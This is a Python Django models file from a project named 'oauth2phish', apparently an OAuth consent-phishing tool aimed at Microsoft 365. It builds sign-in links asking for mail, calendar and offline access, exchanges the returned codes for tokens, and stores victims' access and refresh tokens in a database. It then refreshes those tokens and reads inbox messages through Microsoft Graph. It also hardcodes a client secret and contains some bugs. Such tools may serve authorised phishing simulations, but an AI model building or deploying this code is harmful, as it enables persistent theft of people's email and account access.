from django.db import models
from oauth2phish.db import DBconn
from urllib.parse import quote, urlencode
import requests
import time
import uuid
import json

# Create your models here.
class Auth(models.Model):
    scopes = ['openid',
              'offline_access',
              'User.Read',
              'Mail.Read',
              'Calendars.Read']

    client_id = 'cf79e5d9-7cee-4c46-b294-903ecfcb70e2'
    client_secret = 'iaeozWFXGB99?yjNK009_*^'

    authority = 'https://login.microsoftonline.com'
    authorize_url = '{0}{1}'.format(authority, '/common/oauth2/v2.0/authorize?{0}')
    token_url = '{0}{1}'.format(authority, '/common/oauth2/v2.0/token')



    def get_signin_url(redirect_uri):
        DBconn.connectDB()
      # Build the query parameters for the signin url
        params = { 'client_id': Auth.client_id,
                 'redirect_uri': redirect_uri,
                 'response_type': 'code',
                 'scope': ' '.join(str(i) for i in Auth.scopes)
                }
        signin_url = Auth.authorize_url.format(urlencode(params))
        return signin_url


    def get_token_from_code(auth_code, redirect_uri):
      # Build the post form for the token request
        post_data = { 'grant_type': 'authorization_code',
                    'code': auth_code,
                    'redirect_uri': redirect_uri,
                    'scope': ' '.join(str(i) for i in Auth.scopes),
                    'client_id': Auth.client_id,
                    'client_secret': Auth.client_secret
                  }
        r = requests.post(Auth.token_url, data = post_data)
        try:
            return r.json()
        except:
            return 'Error retrieving token: {0} - {1}'.format(r.status_code, r.text)

    def get_token_from_refresh_token(refresh_token, redirect_uri):
        # Build the post form for the token request
        post_data = { 'grant_type': 'refresh_token',
                    'refresh_token': refresh_token,
                    'redirect_uri': redirect_uri,
                    'scope': ' '.join(str(i) for i in Auth.scopes),
                    'client_id': Auth.client_id,
                    'client_secret': Auth.client_secret
                  }
        r = requests.post(Auth.token_url, data = post_data)
        try:
            return r.json()
        except:
            return 'Error retrieving token: {0} - {1}'.format(r.status_code, r.text)


    def get_access_token(request, redirect_uri):
        DBconn.connectDB()

        user_id = request.session["user_id"]
        if user_id:
            record = DBwrapper.getRecordFromOffice(user_id)
            current_token = record[0][4]
            refresh_token = record[0][5]
            expiration    = record[0][6]

            now = int(time.time())
            if (current_token and now < expiration):
                # Token still valid
                return current_token
            else:
                # Token expired
                #refresh_token = request.session['refresh_token']

                new_tokens = Auth.get_token_from_refresh_token(refresh_token, redirect_uri)
                expiration = int(time.time()) + new_tokens['expires_in'] - 300
                DBwrapper.refreshTokenOffice(user_id, new_tokens['access_token'],
                                             new_tokens['refresh_token'], expiration)

                # Save the token in the session
                request.session['access_token'] = new_tokens['access_token']
                request.session['refresh_token'] = new_tokens['refresh_token']
                request.session['token_expires'] = expiration


                return new_tokens['access_token']
        else:
            return 0


############################################################################################################
class O2mail(models.Model):
    graph_endpoint = 'https://graph.microsoft.com/v1.0{0}'
    def get_my_messages(access_token):
        get_messages_url = graph_endpoint.format('/me/mailfolders/inbox/messages')
        # Use OData query parameters to control the results
        #  - Only first 10 results returned
        #  - Only return the ReceivedDateTime, Subject, and From fields
        #  - Sort the results by the ReceivedDateTime field in descending order
        query_parameters = {'$top': '10',
                          '$select': 'receivedDateTime,subject,from',
                          '$orderby': 'receivedDateTime DESC'}
        r = O2mail.make_api_call('GET', get_messages_url, access_token, parameters = query_parameters)
        if (r.status_code == requests.codes.ok):
            return r.json()
        else:
            return "{0}: {1}".format(r.status_code, r.text)

    def get_me(access_token):
        get_me_url = O2mail.graph_endpoint.format('/me')
        # Use OData query parameters to control the results
        #  - Only return the displayName and mail fields
        query_parameters = {'$select': 'displayName,mail'}
        r = O2mail.make_api_call('GET', get_me_url, access_token, "", parameters=query_parameters)
        if (r.status_code == requests.codes.ok):
            return r.json()
        else:
            return "{0}: {1}".format(r.status_code, r.text)

    # Generic API Sending
    def make_api_call(method, url, token, payload = None, parameters = None):
        # Send these headers with all API calls
        headers = { 'User-Agent' : 'python_tutorial/1.0',
                  'Authorization' : 'Bearer {0}'.format(token),
                  'Accept' : 'application/json' }

          # Use these headers to instrument calls. Makes it easier
          # to correlate requests and responses in case of problems
          # and is a recommended best practice.
        request_id = str(uuid.uuid4())
        instrumentation = { 'client-request-id' : request_id,
                          'return-client-request-id' : 'true' }
        headers.update(instrumentation)
        response = None
        if (method.upper() == 'GET'):
            response = requests.get(url, headers = headers, params = parameters)
        elif (method.upper() == 'DELETE'):
            response = requests.delete(url, headers = headers, params = parameters)
        elif (method.upper() == 'PATCH'):
            headers.update({ 'Content-Type' : 'application/json' })
            response = requests.patch(url, headers = headers, data = json.dumps(payload), params = parameters)
        elif (method.upper() == 'POST'):
            headers.update({ 'Content-Type' : 'application/json' })
            response = requests.post(url, headers = headers, data = json.dumps(payload), params = parameters)
        return response
###############################################################################################################


class DBwrapper(models.Model):
    def DBwrapper():
        DBconn.connectDB()
        return

    def getOfficeAcc():
        accounts = DBconn.getAccountsOffice()
        return accounts

    def getMailsFromOfficeAcc(id):
        mails = DBconn.getEmailOffice(id)
        return mails

    def addTokenToOffice(user, mail, token, access_token, refresh_token, expiration, session_state):
        DBconn.addTokenOffice(user, mail, token, access_token, refresh_token, expiration, session_state)
        return

    def getRecordFromOffice(user_id):
        access_token = DBconn.getRecordFromOffice(user_id)
        return access_token

    def refreshTokenOffice(user_id, access_token, refresh_token, expiration):
        DBconn.refreshTokenOffice(user_id, access_token, refresh_token, expiration)
        return